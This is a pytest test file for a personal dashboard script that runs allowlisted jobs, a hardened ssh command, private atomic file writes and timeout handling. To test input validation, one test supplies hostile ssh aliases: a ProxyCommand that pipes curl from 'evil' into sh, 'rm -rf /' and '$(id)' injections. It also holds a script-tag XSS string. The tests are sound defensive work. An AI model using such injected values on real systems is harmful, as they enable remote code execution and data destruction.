"""scripts/home.py: the allowlist, the one remote command, how a failed job is recorded, and a whole
offline run. No network, and the host command runs here against a fixture home directory.
Design: docs/private/design-home-dashboard.md sections 3 and 4."""
import importlib.util
import json
import os
import re
import stat
import subprocess
import sys
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))
import home_lib as hl  # noqa: E402

_spec = importlib.util.spec_from_file_location("home_cmd", ROOT / "scripts" / "home.py")
home = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(home)

NOW = 1795737600


def cfg(tmp_path, alias="dreamhost"):
    return {"website_repo": tmp_path / "web", "counts_dir": tmp_path / "counts", "host_alias": alias,
            "expiries": [], "private": tmp_path / "private", "out": tmp_path / "out"}


# ---- the allowlist ------------------------------------------------------------------------------

def test_every_job_is_a_list_of_strings_with_no_shell_in_it(tmp_path):
    jobs = home.job_argv(cfg(tmp_path))
    assert set(jobs) == {"release", "counts", "ci", "host"}
    for name, j in jobs.items():
        assert isinstance(j["argv"], list) and all(isinstance(a, str) for a in j["argv"]), name
        assert j["argv"][0] not in ("sh", "bash", "zsh", "/bin/sh", "/bin/bash"), name
        assert "-c" not in j["argv"] or name == "host", name        # the host job's only -c is inside the one remote string


def test_the_runner_never_uses_a_shell():
    src = (ROOT / "scripts" / "home.py").read_text(encoding="utf-8")
    assert "shell=True" not in src and "os.system" not in src and "shell=False" in src


def test_the_ssh_argv_is_exactly_the_hardened_option_set_then_the_alias_then_the_one_literal_command(tmp_path):
    argv = home.job_argv(cfg(tmp_path))["host"]["argv"]
    assert argv == ["ssh", *home.SSH_OPTIONS, "dreamhost", home.REMOTE_CMD]
    opts = " ".join(home.SSH_OPTIONS)
    for must in ("-a", "-x", "-T", "BatchMode=yes", "ClearAllForwardings=yes", "StrictHostKeyChecking=yes", "ConnectTimeout=10"):
        assert must in opts, must


def test_without_a_host_alias_there_is_no_host_job(tmp_path):
    assert "host" not in home.job_argv(cfg(tmp_path, alias=None))


def test_the_counts_script_is_inside_the_configured_website_repo(tmp_path):
    argv = home.job_argv(cfg(tmp_path))["counts"]["argv"]
    assert Path(argv[0]).is_absolute() and str(tmp_path / "web") in argv[0] and argv[1] == "--no-open"


def test_network_jobs_are_marked_so_offline_can_skip_them(tmp_path):
    jobs = home.job_argv(cfg(tmp_path))
    assert {n for n, j in jobs.items() if j["net"]} == {"counts", "ci", "host"}


@pytest.mark.parametrize("alias", ["-oProxyCommand=curl evil|sh", "a b", "host;rm -rf /", "$(id)", "", "-x"])
def test_a_hand_edited_alias_that_could_be_an_ssh_option_is_dropped(tmp_path, alias):
    f = tmp_path / "c.json"
    f.write_text(json.dumps({"host_alias": alias}), encoding="utf-8")
    assert home.load_config(f, home=tmp_path)["host_alias"] is None


def test_a_path_setting_with_dotdot_or_odd_characters_falls_back_to_the_default(tmp_path):
    f = tmp_path / "c.json"
    f.write_text(json.dumps({"website_repo": "../../etc", "counts_dir": "~/a b; rm"}), encoding="utf-8")
    c = home.load_config(f, home=tmp_path)
    assert c["website_repo"] == tmp_path / "Code" / "bristlenose-website" and c["counts_dir"] == tmp_path / "bristlenose-counts"


def test_config_defaults_when_there_is_no_file(tmp_path):
    c = home.load_config(tmp_path / "nope.json", home=tmp_path)
    assert c["host_alias"] is None and c["expiries"] == [] and c["out"] == home.OUT_DIR


# ---- the one remote command ------------------------------------------------------------------------------

def run_remote(home_dir: Path) -> str:
    code = home.REMOTE_PY.replace("https://bristlenose.app/app/news", "http://127.0.0.1:9/never")   # no live request in a test
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=60,
                       env={"HOME": str(home_dir), "PATH": os.environ["PATH"]})
    assert r.returncode == 0, r.stderr
    return r.stdout


def feedback_csv(d: Path, rows):
    p = d / "bristlenose.app" / "data" / "feedback.csv"
    p.parent.mkdir(parents=True)
    p.write_text("time,version,rating,message,kind\n" + "\n".join(rows) + "\n", encoding="utf-8")


def test_the_remote_command_counts_ratings_and_never_prints_a_message(tmp_path):
    marker = "SECRET-MESSAGE-TEXT-9f2"
    (tmp_path / "bn-counts").mkdir()
    (tmp_path / "bn-counts" / "heartbeat").write_text("2026-11-26T20:16:13Z ok files=8 lines=3995 news=5 rewrote=x\n")
    feedback_csv(tmp_path, [f"2026-11-05 10:00:00,0.43.0,neutral,{marker},feedback", "2026-11-04 09:00:00,0.43.0,hate,x,problem",
                            "2026-10-01 09:00:00,0.40.0,love,y,", "2026-10-02 09:00:00,0.40.0,weird-value,z,",
                            "2026-06-09 03:00:00,0.19.0,like,old row with four columns"])
    out = run_remote(tmp_path)
    d = hl.parse_host_output(out)
    assert d is not None, out
    assert (d["neutral"], d["hate"], d["love"], d["like"], d["other"], d["dislike"]) == (1, 1, 1, 1, 1, 0)
    assert d["total"] == 5 and d["problems"] == 1
    assert d["heartbeat_epoch"] == 1795724173 and d["news_status"] == 0 and d["news_expires_epoch"] == 0
    assert d["newest_epoch"] == 1793872800                                           # 2026-11-05 10:00:00 UTC
    assert marker not in out


def test_the_remote_command_with_no_files_still_prints_parseable_zeros(tmp_path):
    d = hl.parse_host_output(run_remote(tmp_path))
    assert d is not None and d["total"] == 0 and d["heartbeat_epoch"] == 0


def test_the_remote_command_has_no_single_quote_and_nothing_interpolated():
    assert "'" not in home.REMOTE_PY
    assert home.REMOTE_CMD == "python3 -c '" + home.REMOTE_PY + "'"


# ---- recording what a job did ---------------------------------------------------------------------------

GOOD = ("heartbeat_epoch=10\nnews_status=200\nnews_expires_epoch=20\nhate=1\ndislike=0\nneutral=2\nlike=0\nlove=0\n"
        "other=0\ntotal=3\nproblems=0\nnewest_epoch=5\n")


def test_a_host_success_replaces_last_good_and_a_failure_does_not_move_it(tmp_path):
    home.record_host(tmp_path, "ok", GOOD.encode(), 1000.0)
    st = hl.read_host_state(tmp_path)
    assert st["last_good"]["fetched_at"] == 1000.0 and st["last_attempt"]["error"] is None
    for i, status in enumerate(("failed", "timeout", "failed")):
        home.record_host(tmp_path, status, b"", 2000.0 + i)
    st = hl.read_host_state(tmp_path)
    assert st["last_good"]["fetched_at"] == 1000.0, "three failures must not freshen the data"
    assert st["last_attempt"]["error"] == "unreachable"


def test_host_output_that_is_not_ours_is_recorded_as_unexpected_and_changes_nothing(tmp_path):
    home.record_host(tmp_path, "ok", GOOD.encode(), 1000.0)
    home.record_host(tmp_path, "ok", b"Welcome to a very friendly host\n" + GOOD.encode(), 3000.0)
    st = hl.read_host_state(tmp_path)
    assert st["last_attempt"]["error"] == "unexpected" and st["last_good"]["fetched_at"] == 1000.0
    assert b"friendly" not in (tmp_path / "host.json").read_bytes()


def test_ci_json_keeps_only_the_five_fields_a_stranger_cannot_write(tmp_path):
    rows = [{"conclusion": "success", "status": "completed", "createdAt": "2026-11-26T20:00:00Z", "headSha": "7c7c79e",
             "event": "push", "displayTitle": "<script>alert(1)</script>", "headBranch": "main"}]
    home.record_ci(tmp_path, "ok", json.dumps(rows).encode())
    saved = json.loads((tmp_path / "ci.json").read_text())
    assert set(saved["runs"][0]) == {"conclusion", "status", "createdAt", "headSha", "event"}
    home.record_ci(tmp_path, "failed", b"garbage")
    home.record_ci(tmp_path, "ok", b"not json")
    assert json.loads((tmp_path / "ci.json").read_text()) == saved                 # a bad read leaves the old file


def test_files_are_written_private_and_atomically(tmp_path):
    hl.atomic_write(tmp_path / "d" / "f.json", "{}")
    f = tmp_path / "d" / "f.json"
    assert stat.S_IMODE(f.stat().st_mode) == 0o600 and stat.S_IMODE(f.parent.stat().st_mode) == 0o700
    assert [p.name for p in f.parent.iterdir()] == ["f.json"], "no temp file left behind"


def test_a_symlink_at_the_target_is_not_followed(tmp_path):
    victim = tmp_path / "victim"
    victim.write_text("keep")
    link = tmp_path / "d" / "home.html"
    link.parent.mkdir()
    link.symlink_to(victim)
    hl.atomic_write(link, "page")                       # os.replace swaps the link itself; the target is untouched
    assert victim.read_text() == "keep" and not link.is_symlink()


# ---- when a job runs --------------------------------------------------------------------------------------

@pytest.mark.parametrize("fresh_for,mt,offline,net,want", [
    (3600, None, False, True, True),                 # never ran
    (3600, NOW - 100, False, True, False),           # fresh enough
    (3600, NOW - 4000, False, True, True),           # older than its window
    (0, NOW - 1, False, False, True),                # a local job with no window always runs
    (3600, NOW - 4000, True, True, False),           # offline skips a network job even when old
    (0, NOW - 1, True, False, True)])                # ... but not a local one
def test_should_run(fresh_for, mt, offline, net, want):
    assert home.should_run({"fresh_for": fresh_for, "net": net}, mt, NOW, offline) is want


# ---- the runner ----------------------------------------------------------------------------------------------

def test_a_job_that_hangs_is_killed_whole_and_reported_as_a_timeout():
    t0 = time.time()
    status, out = home.run(["sleep", "30"], 0.5)
    assert status == "timeout" and out == b"" and time.time() - t0 < 10


def test_a_timed_out_job_takes_its_children_with_it(tmp_path):
    """A deadline that kills only the child leaves its own children running (scp spawns ssh)."""
    sentinel = tmp_path / "grandchild-ran"
    code = ("import subprocess,sys,time;"
            "subprocess.Popen([sys.executable,'-c','import time,sys,pathlib;time.sleep(2);pathlib.Path(sys.argv[1]).write_text(\"x\")',sys.argv[1]]);"
            "time.sleep(30)")
    assert home.run([sys.executable, "-c", code, str(sentinel)], 0.5)[0] == "timeout"
    time.sleep(3)
    assert not sentinel.exists(), "the grandchild outlived its job"


def test_a_failing_job_is_failed_and_a_missing_program_is_failed_not_a_crash():
    assert home.run(["false"], 5)[0] == "failed"
    assert home.run(["/no/such/program"], 5)[0] == "failed"
    assert home.run(["echo", "hi"], 5) == ("ok", b"hi\n")


def test_the_runner_refuses_anything_that_is_not_a_list_of_strings():
    with pytest.raises(AssertionError):
        home.run("echo hi", 5)
    with pytest.raises(AssertionError):
        home.run(["echo", 1], 5)


def test_a_reader_that_raises_or_exits_becomes_one_unknown_panel_not_the_end_of_the_run():
    def boom():
        raise ValueError("secret detail at /Users/x/private")

    def bye():
        raise SystemExit(2)
    for fn in (boom, bye):
        p = home.guarded("x", "X", fn)
        assert p["status"] == "unknown" and p["error"] == hl.ERR["failed"] and "secret" not in json.dumps(p)
    assert home.guarded("ok", "OK", lambda: {"id": "ok"}) == {"id": "ok"}


# ---- a whole run ----------------------------------------------------------------------------------------------

def test_an_offline_run_writes_the_page_private_and_runs_no_network_job(tmp_path, monkeypatch, capsys):
    calls = []
    real_run = home.run

    def spy(argv, timeout):
        calls.append(argv[0])
        return real_run(argv, timeout) if argv[0] == sys.executable else ("failed", b"")

    monkeypatch.setattr(home, "OUT_DIR", tmp_path / "out")
    monkeypatch.setattr(home, "CONFIG", tmp_path / "none.json")
    monkeypatch.setattr(home, "PYTEST_LIVE", tmp_path / "live.txt")
    monkeypatch.setattr(home, "run", spy)
    assert home.main(["--offline", "--no-open"]) == 0
    page = (tmp_path / "out" / "home.html").read_text(encoding="utf-8")
    assert stat.S_IMODE((tmp_path / "out" / "home.html").stat().st_mode) == 0o600
    assert stat.S_IMODE((tmp_path / "out").stat().st_mode) == 0o700
    assert not any(c in ("ssh", "gh") or c.endswith("counts-refresh.sh") for c in calls), calls
    ids = re.findall(r'"id":"(\w+)"', page)
    for pid in ("installs", "visitors", "release", "tests", "bugs", "feedback", "launch", "expiries", "host"):
        assert pid in ids, pid
    assert "no data" in page or "nodata" in page


def test_unknown_arguments_are_refused_and_help_works(capsys):
    assert home.main(["--bogus"]) == 2
    assert home.main(["--help"]) == 0
